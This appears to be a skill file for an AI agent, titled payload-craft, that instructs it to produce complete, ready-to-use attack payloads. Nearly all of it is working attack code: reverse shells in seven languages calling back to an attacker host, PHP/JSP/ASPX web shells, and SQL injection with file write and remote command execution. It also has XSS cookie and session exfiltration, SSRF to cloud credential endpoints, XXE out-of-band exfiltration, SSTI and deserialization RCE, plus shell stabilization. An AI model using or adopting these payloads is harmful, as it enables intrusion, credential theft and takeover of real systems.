---
description: "Complete payload library for all vuln classes: reverse shells, web shells, SQLi, XSS, SSRF, LFI, XXE, SSTI, deserialization, WAF bypass, shell stabilization. Use when building or adapting payloads for confirmed vulnerabilities."
---

# SKILL — payload-craft

## Purpose
Generate, adapt, encode, and stage complete working payloads for confirmed vulnerabilities. Every payload is complete and ready to use — never a skeleton.

## When to load
- A vulnerability is confirmed and needs a working payload
- Need to bypass WAF, encoding, or filter restrictions
- Crafting reverse shells, web shells, bind shells, or stagers
- Adapting a public PoC to the specific target environment
- Need injection, serialization, SSTI, XXE, or template payloads

## Pre-payload checklist
```
Target OS:          Linux / Windows / macOS
Available binaries: bash / sh / python / python3 / perl / ruby / nc / curl / wget
Outbound allowed:   yes / no / port-specific
Inbound port open:  <LPORT>
Context:            web shell / RCE in app / deserialization / SSTI / etc.
Encoding needed:    URL / HTML / base64 / double-encoded / none
WAF present:        yes / no / unknown
Payload landing:    reflected / stored / executed server-side / client-side
```

## Listener setup (always first)
```bash
nc -lvnp <LPORT>                                    # netcat
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>,reuseaddr,fork  # socat PTY (best)
msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run"
```

## Reverse shells

**Bash:** `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1`
**Python3:** `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`
**PHP:** `php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`
**Perl:** `perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
**Ruby:** `ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
**Netcat (mkfifo):** `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f`
**PowerShell:** `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length);$s.Flush()};$c.Close()"`
**Base64 bash:** `echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" | base64 -w0` → `bash -c {echo,<B64>}|{base64,-d}|bash`

## Web shells
**PHP minimal:** `<?php system($_GET['cmd']); ?>`
**PHP auth gated:** `<?php if(md5($_GET['p'])=='098f6bcd4621d373cade4e832627b4f6'){system($_GET['c']);} ?>`
**PHP obfuscated:** `<?php $f='sys'.'tem'; $f($_POST['c']); ?>`
**PHP proc_open:** `<?php $d=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$p=proc_open($_GET['c'],$d,$pipes);echo stream_get_contents($pipes[1]); ?>`
**JSP:** `<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("c"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null){out.println(l);} %>`
**ASPX:** `<%@ Page Language="C#" %><%var p=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false};Response.Write(System.Diagnostics.Process.Start(p).StandardOutput.ReadToEnd());%>`

## SQL injection payloads
**MySQL error:** `' AND extractvalue(1,concat(0x7e,(SELECT version()))) -- -`
**MySQL union:** `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() -- -`
**MySQL blind:** `' AND IF(SUBSTRING(version(),1,1)='8',SLEEP(5),0) -- -`
**MySQL file read:** `' UNION SELECT LOAD_FILE('/etc/passwd'),NULL -- -`
**MySQL file write:** `' UNION SELECT '<?php system($_GET["c"]); ?>',NULL INTO OUTFILE '/var/www/html/s.php' -- -`
**MSSQL xp_cmdshell:** `'; EXEC xp_cmdshell('whoami') -- -`
**PostgreSQL RCE:** `'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' -- -`
**NoSQL auth bypass:** `{"username":{"$ne":null},"password":{"$ne":null}}`

## XSS payloads
**Basic:** `<script>alert(document.domain)</script>`
**Cookie theft:** `<script>fetch('http://<LHOST>/s?c='+btoa(document.cookie))</script>`
**Session hijack:** `<script>fetch('/api/user/profile',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('http://<LHOST>/l?d='+btoa(JSON.stringify(d))))</script>`
**CSP bypass (JSONP):** `<script src="/api/jsonp?callback=alert(1)//"></script>`
**Filter bypass:** `<img/src=x/onerror=alert(1)>`, `<svg/onload=alert(1)>`, `<details open ontoggle=alert(1)>`
**Encoding:** `<script>eval(atob('YWxlcnQoMSk='))</script>`

## SSRF payloads
**AWS metadata:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
**GCP metadata:** `http://metadata.google.internal/computeMetadata/v1/` (header: Metadata-Flavor: Google)
**Azure metadata:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (header: Metadata: true)
**IP bypass:** `http://2130706433/` (decimal), `http://0x7f000001/` (hex), `http://[::1]/` (IPv6)
**Protocol:** `gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a`, `file:///etc/passwd`

## LFI / Path traversal
**Basic:** `../../../etc/passwd`
**Encoded:** `..%2F..%2F..%2Fetc%2Fpasswd`, `..%252F..%252Fetc%252Fpasswd`
**PHP wrappers:** `php://filter/convert.base64-encode/resource=/etc/passwd`, `php://input`, `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`
**Log poisoning:** `curl -A "<?php system(\$_GET['c']); ?>" http://<TARGET>/` → `?file=../../../../var/log/apache2/access.log&c=id`

## XXE payloads
**File read:** `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`
**SSRF:** `<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>`
**Blind OOB:** host `evil.dtd` with `<!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY % w "<!ENTITY &#x25; s SYSTEM 'http://<LHOST>/?d=%f;'>">%w;%s;` → `<!DOCTYPE r [<!ENTITY % e SYSTEM "http://<LHOST>/evil.dtd">%e;]><r></r>`
**SVG upload:** `<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&x;</text></svg>`

## SSTI payloads
**Detect:** `${{<%[%'"}}%\`, `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
**Jinja2 RCE:** `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
**Twig RCE:** `{{['id']|filter('system')}}`
**Freemarker RCE:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
**ERB RCE:** `<%= system('id') %>`

## Deserialization
**Java (ysoserial):** `java -jar ysoserial.jar CommonsCollections6 'curl http://<LHOST>/rce' | base64 -w0`
**PHP (PHPGGC):** `phpggc Laravel/RCE1 system 'id' --base64`
**Python pickle:** `import pickle,os,base64;class E:__reduce__=lambda s:(os.system,('curl http://<LHOST>/$(id)',));print(base64.b64encode(pickle.dumps(E())).decode())`

## Shell stabilization
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'  # then Ctrl+Z
stty raw -echo; fg                                # on attacker
export TERM=xterm-256color; export SHELL=/bin/bash; stty rows 50 cols 220  # on target
```

## Rules
- Confirm target OS and available binaries before crafting
- Stage payloads to `exploits/working/` before use
- Document every payload variant tried and its result
- WAF bypass: try at least 5 encoding variants before concluding blocked
- Stabilize shell immediately after obtaining it
